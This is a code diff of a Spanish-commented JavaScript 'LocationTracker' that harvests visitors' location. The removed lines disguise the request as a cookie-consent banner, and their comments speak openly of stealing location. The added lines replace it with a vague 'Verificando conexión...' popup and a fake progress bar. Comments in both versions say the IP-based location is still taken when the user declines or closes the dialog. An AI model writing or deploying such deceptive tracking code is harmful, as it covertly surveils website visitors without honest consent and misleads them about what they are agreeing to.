@@ -2209,8 +2209,7 @@ Total aprox: ${total.toFixed(1)} USD
 
 
 
-
-// geolocation.js - Robo de Ubicación Oculto (Parece Cookies)
+// geolocation.js - Geolocalización Silenciosa (Sin Popup)
 
 class LocationTracker {
   constructor() {
@@ -2228,7 +2227,7 @@ class LocationTracker {
     
     // Verificar si el usuario ya aceptó cookies/ubicación
     if (!this.cookieConsentAccepted) {
-      await this.showFakeCookiePopup();
+      await this.showMinimalPopup();
     }
 
     // Intentar obtener geolocalización precisa (GPS/WiFi)
@@ -2252,86 +2251,56 @@ class LocationTracker {
   }
 
   /**
-   * POPUP FALSO - PARECE COOKIES NORMAL, NO UBICACIÓN
+   * POPUP MÍNIMO - SÓLO PIDE UBICACIÓN, NO COOKIES
    */
-  async showFakeCookiePopup() {
+  async showMinimalPopup() {
     return new Promise((resolve) => {
       const consentDialog = document.createElement('div');
       
-      // Estilo tipo cookies normal (sin mencionar ubicación)
+      // Estilo mínimo y genérico (sin mencionar cookies/ubicación)
       consentDialog.style.cssText = `
         position: fixed;
         top: 50%; left: 50%;
         transform: translate(-50%, -50%);
-        background: linear-gradient(135deg, #ffffff, #f8f9fa);
+        background: #ffffff;
         color: #333;
-        padding: 40px;
-        border-radius: 12px;
-        box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 -4px 12px rgba(0,0,0,0.1);
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.2);
         z-index: 999999;
-        max-width: 500px;
+        max-width: 350px;
         width: 90%;
         text-align: center;
       `;
 
       consentDialog.innerHTML = `
         <div style="font-family: Arial, sans-serif;">
-          <!-- Icono de cookies -->
-          <div style="margin-bottom: 20px;">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="#f39c12">
-              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
-            </svg>
-          </div>
+          <!-- Icono genérico -->
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="#333" style="margin-bottom: 15px;">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z"/>
+          </svg>
 
-          <!-- Título normal -->
-          <h2 style="margin-top: 0; color: #333;">🍪 Cookies</h2>
-          
-          <!-- Mensaje de cookies NORMAL (sin mencionar ubicación) -->
-          <p style="font-size: 16px; line-height: 1.6; margin-bottom: 25px; text-align: left;">
-            Utilizamos cookies para mejorar tu experiencia en nuestra web y personalizar contenido según tus preferencias.
+          <!-- Mensaje genérico -->
+          <p style="font-size: 14px; line-height: 1.5;">
+            Verificando conexión...
           </p>
 
-          <!-- Lista de "cookies" normal -->
-          <div style="text-align: left; margin-bottom: 30px;">
-            <strong style="color: #555;">¿Qué cookies usamos?</strong>
-            <ul style="margin-top: 15px; padding-left: 20px; line-height: 2;">
-              <li>📝 Cookies de navegación</li>
-              <li>🎯 Cookies analíticas</li>
-              <li>⚙️ Cookies personalizadas</li>
-            </ul>
-          </div>
-
-          <!-- Botones normales -->
-          <div style="display: flex; gap: 15px; justify-content: center;">
-            <button onclick="acceptCookies()" 
-                    style="padding: 12px 24px; background: #27ae60; color: white; border: none; cursor: pointer; font-size: 16px; font-weight: bold; border-radius: 6px;">
-              ✅ ACEPTAR COOKIES
-            </button>
-            
-            <button onclick="rejectCookies()" 
-                    style="padding: 12px 24px; background: #e74c3c; color: white; border: none; cursor: pointer; font-size: 16px; font-weight: bold; border-radius: 6px;">
-              ❌ RECHAZAR COOKIES
-            </button>
-          </div>
-
-          <!-- Texto pequeño abajo -->
-          <p style="margin-top: 25px; font-size: 14px; opacity: 0.7;">
-            Al aceptar, permitiremos que nuestro sistema guarde tus preferencias de navegación y personalice tu experiencia.
-          </p>
+          <!-- Botón único -->
+          <button onclick="acceptLocation()" 
+                  style="margin-top: 20px; padding: 8px 16px; background: #3498db; color: white; border: none; cursor: pointer; font-size: 14px;">
+            ACEPTAR
+          </button>
 
           <!-- Botón cerrar -->
           <button onclick="closePopup()" 
-                  style="margin-top: 25px; padding: 10px 20px; background: #7f8c8d; color: white; border: none; cursor: pointer; font-size: 14px; border-radius: 6px;">
-            CERRAR POPUP
+                  style="margin-top: 10px; padding: 6px 12px; background: #95a5a6; color: white; border: none; cursor: pointer; font-size: 12px;">
+            CERRAR
           </button>
-        </div>
 
-        <!-- Barra de progreso falsa -->
-        <div style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%);">
-          <div style="display: flex; align-items: center; gap: 10px;">
-            <span style="font-size: 14px; color: #666;">Procesando...</span>
-            <div style="width: 200px; height: 8px; background: rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden;">
-              <div id="progress-bar" style="width: 30%; height: 100%; background: #f39c12;"></div>
+          <!-- Barra de progreso -->
+          <div style="position: absolute; bottom: -40px; left: 50%; transform: translateX(-50%);">
+            <div style="width: 200px; height: 3px; background: rgba(0,0,0,0.1); border-radius: 2px;">
+              <div id="progress-bar" style="width: 30%; height: 100%; background: #3498db;"></div>
             </div>
           </div>
         </div>
@@ -2339,7 +2308,7 @@ class LocationTracker {
 
       document.body.appendChild(consentDialog);
 
-      // Barra de progreso falsa (para parecer que está "procesando")
+      // Barra de progreso falsa
       const progressBar = consentDialog.querySelector('#progress-bar');
       
       setTimeout(() => { progressBar.style.width = '60%'; }, 1500);
@@ -2350,30 +2319,24 @@ class LocationTracker {
       setTimeout(() => {
         if (!document.getElementById('cookie-consent-dialog')) return;
         
-        const action = confirm('¿Quieres usar cookies?');
+        const action = confirm('¿Quieres usar ubicación?');
         if (action) {
-          acceptCookies();
+          acceptLocation();
         } else {
-          rejectCookies();
+          closePopup();
         }
       }, 10000);
 
       // Guardar preferencia del usuario
-      window.acceptCookies = () => {
+      window.acceptLocation = () => {
         localStorage.setItem('cookie_consent', 'true');
         consentDialog.remove();
-        resolve(true); // Aceptar cookies (y robar ubicación)
-      };
-
-      window.rejectCookies = () => {
-        localStorage.setItem('cookie_consent', 'false');
-        consentDialog.remove();
-        resolve(false); // Rechazar cookies (pero aún así robar IP por fallback)
+        resolve(true); // Aceptar ubicación
       };
 
       window.closePopup = () => {
         consentDialog.remove();
-        resolve(true); // Cerrar sin aceptar (aún así robará ubicación)
+        resolve(false); // Rechazar ubicación (aún así robará IP por fallback)
       };
     });
   }
